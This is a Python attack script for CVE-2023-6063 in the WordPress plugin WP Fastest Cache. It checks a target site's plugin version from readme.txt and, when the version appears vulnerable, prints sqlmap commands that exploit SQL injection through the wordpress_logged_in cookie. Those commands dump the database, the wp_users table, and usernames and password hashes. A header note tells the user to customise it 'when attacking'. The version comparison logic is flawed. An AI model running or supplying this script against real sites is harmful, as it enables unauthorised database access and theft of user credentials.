'''
NOTE: My wordpress database name is wordpress. When attacking, you should customize accordingly.
'''

from bs4 import BeautifulSoup
import re
import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
requests.adapters.DEFAULT_RETRIES = 2
n = len(sys.argv)

x = '''
 █████╗ ██╗   ██╗███████╗      ██████╗  █████╗ ██████╗ ██████╗        █████╗  █████╗  █████╗ ██████╗ 
██╔══██╗██║   ██║██╔════╝      ╚════██╗██╔══██╗╚════██╗╚════██╗      ██╔═══╝ ██╔══██╗██╔═══╝ ╚════██╗
██║  ╚═╝╚██╗ ██╔╝█████╗  █████╗  ███╔═╝██║  ██║  ███╔═╝ █████╔╝█████╗██████╗ ██║  ██║██████╗  █████╔╝
██║  ██╗ ╚████╔╝ ██╔══╝  ╚════╝██╔══╝  ██║  ██║██╔══╝   ╚═══██╗╚════╝██╔══██╗██║  ██║██╔══██╗ ╚═══██╗
╚█████╔╝  ╚██╔╝  ███████╗      ███████╗╚█████╔╝███████╗██████╔╝      ╚█████╔╝╚█████╔╝╚█████╔╝██████╔╝
 ╚════╝    ╚═╝   ╚══════╝      ╚══════╝ ╚════╝ ╚══════╝╚═════╝        ╚════╝  ╚════╝  ╚════╝ ╚═════╝ 
MINKAY
'''

print(x)

target = sys.argv[1]
target = target+"/wp-content/plugins/wp-fastest-cache/readme.txt"
#print(target)

try:
    response = requests.get(f"{target}",verify=False)
    if response.status_code == 200:
        soup = BeautifulSoup(response.text,'html.parser')
        s = str(soup)
        version = re.search(r'= (\d+).(\d+).(\d+) =',s)
        if version:
            v = version.group()
            x1 = v.split(" ")
            x2 = x1[1].split('.')
            x3 = int(x2[0])
            x4 = int(x2[1])
            x5 = int(x2[2])
            if x3 <= 1 and x4 <=2 and x5 < 2:
                print('Found Following Version for Plugin wp-fastest-cache: '+str(x3)+'.'+str(x4)+'.'+str(x5)+' Which appears to be vulnerable to CVE-2023-6063')
                print('\n[+] You can dump the whole database with:')
                print(f'sqlmap --dbms=mysql -u "{target}/wp-login.php" --cookie=\'wordpress_logged_in=*\' --level=2 --batch --time-sec=1')
                print('\n[+] To dump table from wordpress database:')
                print(f'sqlmap --dbms=mysql -u "{target}/wp-login.php" --cookie=\'wordpress_logged_in=*\' --level=2 --batch --time-sec=1 --tables -D wordpress')
                print('\n[+] To dump column from wp_users tables:')
                print(f'sqlmap --dbms=mysql -u "{target}/wp-login.php" --cookie=\'wordpress_logged_in=*\' --level=2 --batch --time-sec=1 --columns -D wordpress -T wp_users')
                print('\n[+] To dump only WordPress usernames and passwords columns (you should check if users table have the default name):')
                print(f'sqlmap --dbms=mysql -u "{target}/wp-login.php" --cookie=\'wordpress_logged_in=*\' --level=2 --batch --time-sec=1 -C user_login,user_pass -D wordpress -T wp_users')

            else:
                print('Found Following Version for Plugin wp-fastest-cache: '+str(x3)+'.'+str(x4)+'.'+str(x5)+' Which does not appears to be vulnerable to CVE-2023-6063')
        else:
            print("Script Does not able to find Version for Plugin wp-fastest-cache, Check Manually")
    else:
        print("Server Not Available",response.status_code)
except Exception as e:
    print("Please Check URL",e)
